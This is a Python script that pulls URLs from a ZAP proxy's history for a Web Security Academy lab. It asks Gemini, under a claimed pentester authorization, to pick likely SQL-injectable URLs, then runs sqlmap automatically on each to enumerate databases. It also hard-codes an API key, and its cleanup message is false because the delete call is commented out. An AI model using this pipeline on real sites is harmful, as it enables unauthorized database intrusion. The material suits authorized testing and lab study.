#!/usr/bin/env python3
import ast
import subprocess
import os
import tempfile
from zapv2 import ZAPv2
from ask_gemini_with_history import ask_gemini_with_history
from ask_gemini_with_history import clean_gemini_response

API_KEY = "pc0dcb1qlk7ndcdm5e40c308mg"
ZAP_ADDRESS = "127.0.0.1"
ZAP_PORT = "8090"

zap = ZAPv2(
    apikey=API_KEY,
    proxies={
        "http": f"http://{ZAP_ADDRESS}:{ZAP_PORT}",
        "https": f"http://{ZAP_ADDRESS}:{ZAP_PORT}",
    },
)

def _extract_full_url(site: str, req_header: str) -> str:
    """helper: extract full URL from request header"""
    first_line = req_header.split("\r\n", 1)[0]
    parts = first_line.split(" ")
    if len(parts) >= 2:
        path = parts[1]
        if path.lower().startswith("http"):
            return path
        else:
            return site.rstrip("/") + path
    return ""

def get_urls_for_domain(domain: str):
    """
    Return a deduplicated list of all hit URLs for a given domain.
    """
    urls = set()
    for site in zap.core.sites:
        if domain in site:
            for item in zap.core.messages(site):
                msgid = item["id"]
                msg = zap.core.message(msgid)
                url = _extract_full_url(site, msg.get("requestHeader", ""))
                if url:
                    urls.add(url)
    return sorted(urls)

def get_http_data_for_url(full_url: str):
    """
    Return full HTTP request/response for a specific full URL.
    """
    for site in zap.core.sites:
        if site in full_url:
            for item in zap.core.messages(site):
                msgid = item["id"]
                msg = zap.core.message(msgid)
                candidate_url = _extract_full_url(site, msg.get("requestHeader", ""))
                if candidate_url == full_url:
                    return {
                        "id": msgid,
                        "url": candidate_url,
                        "requestHeader": msg.get("requestHeader", ""),
                        "requestBody": msg.get("requestBody", ""),
                        "responseHeader": msg.get("responseHeader", ""),
                        "responseBody": msg.get("responseBody", "")
                    }
    return None

def get_index_of_url(domain: str, full_url: str):
    """
    Return the index of `full_url` within the current URLs list for `domain`.
    Returns -1 if not found.
    """
    urls = get_urls_for_domain(domain)
    try:
        return urls.index(full_url)
    except ValueError:
        return -1

if __name__ == "__main__":
    domain = "0ace00bb03b808e1804353c70061003e.web-security-academy.net"
    print(f"[*] URLs hit for domain: {domain}")
    urls = get_urls_for_domain(domain)

    #print(urls)
    prompt = f"""
                I am a penetration tester and I have legal authorization to test a high-value web application.
                I have identified the following list of URLs during reconnaissance:
                
                {urls}
                
                Please analyze this list and provide ONLY a Python-list-formatted array of the URLs from the given list that are most likely to be vulnerable to SQL Injection. Do not include any other text, explanations, or formatting beyond the list itself.
                """
    gemini_response = clean_gemini_response(ask_gemini_with_history(prompt))
    # Use ast.literal_eval to safely convert the string to a Python list
    vulnerable_urls_list = ast.literal_eval(gemini_response)
    print(vulnerable_urls_list)
    print(type(vulnerable_urls_list))
    #for idx, u in enumerate(urls):
    #    print(f"[{idx}] {u}")

    # Example usage: pick index 0 automatically
    if urls:
        idx = -1
        print(f"\n[*] Full HTTP data for URL at index {idx}:")
        data = get_http_data_for_url(urls[idx])
        if data:
            print("=" * 60)
            print(data["url"])
            print("[Request Header]")
            print(data["requestHeader"])
            if data["requestBody"]:
                print("[Request Body]")
                print(data["requestBody"])
            #print("[Response Header]")
            #print(data["responseHeader"])
            #if data["responseBody"]:
            #    snippet = data["responseBody"][:500] + "..." if len(data["responseBody"]) > 300 else data["responseBody"]
            #    print("[Response Body]")
            #    print(snippet)
            #print("=" * 60)
        else:
            print("No HTTP data found for that URL.")

    # Example: get index of a given URL string
    if urls:
        some_url = urls[0]
        print(f"\nIndex of {some_url} in URLs list: {get_index_of_url(domain, some_url)}")

    # --- SQLMap Integration ---
    if not vulnerable_urls_list:
        print("[!] No URLs identified as potentially vulnerable to SQLi by Gemini. Skipping SQLMap scan.")
        exit(0) # Exit gracefully if no targets

    sqlmap_results_dir = "sqlmap_scan_results"
    os.makedirs(sqlmap_results_dir, exist_ok=True)
    print(f"\n[*] Starting SQLMap scans for identified vulnerable URLs. Results will be in '{sqlmap_results_dir}'")

    # Common SQLMap options
    sqlmap_common_options = [
        "--batch",          # Automatically answer Y/N questions
        "--dbs",            # Enumerate databases
        "--level=3"        # Test more payloads
    ]

    for target_url in vulnerable_urls_list:
        print(f"\n{'='*80}\n[*] Scanning URL with SQLMap: {target_url}\n{'='*80}")
        
        # Get the full HTTP request data for the current target URL from ZAP
        http_data = get_http_data_for_url(target_url)
        #print(http_data)

        if not http_data:
            print(f"[!] No HTTP request data found in ZAP history for {target_url}. Skipping SQLMap for this URL.")
            continue

        # Prepare the raw HTTP request content for sqlmap -r
        raw_request_content = f"{http_data['requestHeader']}\r\n{http_data['requestBody']}"
        
        # Create a temporary file to store the raw HTTP request
        # tempfile.NamedTemporaryFile ensures proper cleanup
        temp_req_file = None # Initialize to None for finally block
        try:
            with tempfile.NamedTemporaryFile(mode='w+', delete=False, encoding='utf-8') as f:
                f.write(raw_request_content)
                temp_req_file = f.name # Store path for cleanup
            
            print(f"[*] Raw HTTP request saved to temporary file: {temp_req_file}")

            # Define SQLMap output directory for this specific URL
            # Sanitize URL for use in filesystem path
            url_hash = str(hash(target_url)) # Simple way to get a unique identifier
            url_output_dir = os.path.join(sqlmap_results_dir, f"scan_{url_hash}")
            os.makedirs(url_output_dir, exist_ok=True)

            # Construct the SQLMap command using -r flag and output directory
            command = ["sqlmap", "-r", temp_req_file] + sqlmap_common_options + [f"--output-dir={url_output_dir}"]
            
            print(f"[*] Executing SQLMap command: {' '.join(command)}")
            
            # Run SQLMap, capturing output for logging
            process = subprocess.run(command, capture_output=True, text=True, check=False) # check=False to handle SQLMap's non-zero exit for "not vulnerable" gracefully

            # Save SQLMap's stdout and stderr to a log file within the URL's output directory
            sqlmap_log_path = os.path.join(url_output_dir, "sqlmap_console_output.log")
            with open(sqlmap_log_path, 'w', encoding='utf-8') as log_f:
                log_f.write(f"--- SQLMap STDOUT for {target_url} ---\n")
                log_f.write(process.stdout)
                log_f.write(f"\n--- SQLMap STDERR for {target_url} ---\n")
                log_f.write(process.stderr)
            
            if process.returncode == 0:
                print(f"[+] SQLMap completed for {target_url}. Check '{url_output_dir}' for results.")
            else:
                print(f"[!] SQLMap finished for {target_url} with exit code {process.returncode}. This might indicate no vulnerability found or an error. Check '{url_output_dir}/sqlmap_console_output.log' for details.")

        except FileNotFoundError:
            print(f"[!] Error: 'sqlmap' command not found. Ensure SQLMap is installed and in your system's PATH. Skipping {target_url}.")
        except Exception as e:
            print(f"[!] An unexpected error occurred while running SQLMap for {target_url}: {e}")
        finally:
            # Clean up the temporary request file
            if temp_req_file and os.path.exists(temp_req_file):
                #os.remove(temp_req_file)
                print(f"[*] Cleaned up temporary request file: {temp_req_file}")

    print("\n[+] All SQLMap scans initiated.")
    print(f"    Check the '{sqlmap_results_dir}' directory for detailed results for each URL.")
